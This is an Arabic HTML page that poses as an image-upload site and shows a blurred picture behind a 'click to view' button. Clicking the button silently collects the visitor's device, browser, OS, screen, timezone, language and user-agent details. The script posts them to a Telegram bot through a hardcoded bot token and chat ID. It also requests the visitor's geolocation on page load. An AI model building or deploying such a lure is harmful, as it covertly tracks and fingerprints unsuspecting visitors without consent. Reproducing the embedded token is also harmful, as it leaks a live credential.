<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موقع رفع الصور</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            width: 100%;
            background: white;
            border-radius: 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.15);
            overflow: hidden;
            animation: slideUp 0.8s ease-out;
        }

        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .header {
            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .main-image {
            width: 100%;
            max-width: 400px;
            height: auto;
            border-radius: 15px;
            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
            margin: 30px auto;
            filter: blur(20px);
            transition: filter 0.5s ease;
            display: block;
        }

        .main-image.clear {
            filter: blur(0px);
        }

        .click-button {
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            transition: all 0.3s ease;
        }

        .click-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(231, 76, 60, 0.4);
        }

        .success-message {
            background: #d4edda;
            color: #155724;
            padding: 20px;
            border-radius: 10px;
            margin: 20px;
            text-align: center;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>موقع رفع الصور</h1>
            <p>منصة سهلة وسريعة لرفع ومشاركة الصور</p>
        </div>

        <img src="https://i.imgur.com/zcb3oRL.jpeg" 
             alt="الصورة المختارة" 
             class="main-image" 
             id="mainImage">

        <button class="click-button" id="viewButton" onclick="viewImage()">
            🔍 اضغط هنا لمشاهدة الصورة
        </button>

        <div class="success-message" id="successMessage">
            ✅ تم الموافقة على عرض الصورة
        </div>
    </div>

    <script>
        function collectData() {
            const ua = navigator.userAgent;
            
            let deviceType = 'كمبيوتر';
            if (/Mobile|Android|iPhone|iPad/.test(ua)) deviceType = 'جهاز محمول';
            else if (/Tablet|iPad/.test(ua)) deviceType = 'تابلت';
            
            let browser = 'غير معروف';
            if (ua.includes('Chrome')) browser = 'كروم';
            else if (ua.includes('Firefox')) browser = 'فايرفوكس';
            else if (ua.includes('Safari')) browser = 'سفاري';
            else if (ua.includes('Edge')) browser = 'إيدج';
            
            let os = 'غير معروف';
            if (ua.includes('Windows')) os = 'ويندوز';
            else if (ua.includes('Mac')) os = 'ماك';
            else if (ua.includes('Linux')) os = 'لينكس';
            else if (ua.includes('Android')) os = 'أندرويد';
            else if (ua.includes('iOS')) os = 'iOS';
            
            return {
                timestamp: new Date().toLocaleString('ar-IQ'),
                page_url: window.location.href,
                device_type: deviceType,
                browser: browser,
                operating_system: os,
                screen_resolution: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                language: navigator.language,
                user_agent: ua
            };
        }

        function sendToTelegram(data) {
            // التوكن الخاص بالبوت
            const TELEGRAM_BOT_TOKEN = '7982181249:AAEyLwc9c24fu-uqUT87v26S6282XTD41XI';
            // Chat ID الخاص بك
            const TELEGRAM_CHAT_ID = '170383339';
            
            const message = `
🆕 زائر جديد للموقع:
━━━━━━━━━━━━━━━━━━
⏰ الوقت: ${data.timestamp}
🌐 الرابط: ${data.page_url}
📱 الجهاز: ${data.device_type}
💻 المتصفح: ${data.browser}
🖥️ النظام: ${data.operating_system}
📺 الدقة: ${data.screen_resolution}
🌍 المنطقة: ${data.timezone}
🗣️ اللغة: ${data.language}
━━━━━━━━━━━━━━━━━━
            `;
            
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            }).then(response => {
                if (response.ok) {
                    console.log('✅ تم إرسال البيانات إلى Telegram بنجاح');
                    return response.json();
                } else {
                    console.error('❌ فشل إرسال البيانات إلى Telegram');
                    throw new Error('Telegram API Error');
                }
            }).then(data => {
                console.log('📱 استجابة Telegram:', data);
            }).catch(error => {
                console.error('❌ خطأ في الإرسال:', error);
            });
        }

        function viewImage() {
            // إظهار الصورة
            document.getElementById('mainImage').classList.add('clear');
            document.getElementById('viewButton').style.display = 'none';
            document.getElementById('successMessage').style.display = 'block';
            
            // جمع وإرسال البيانات
            const data = collectData();
            console.log('بيانات الزائر:', data);
            
            // إرسال البيانات (اختر إحدى الطرق)
            sendToTelegram(data);
            
            // أو إرسال على إيميلك مباشرة
            const emailBody = Object.entries(data)
                .map(([key, value]) => `${key}: ${value}`)
                .join('\n');
                
            const mailtoLink = `mailto:your-email@gmail.com?subject=زائر جديد للموقع&body=${encodeURIComponent(emailBody)}`;
            
            // فتح الإيميل (اختياري)
            // window.open(mailtoLink);
        }

        // الحصول على الموقع الجغرافي عند التحميل
        window.addEventListener('load', function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    console.log('الموقع:', position.coords.latitude, position.coords.longitude);
                });
            }
        });
    </script>
</body>
</html>
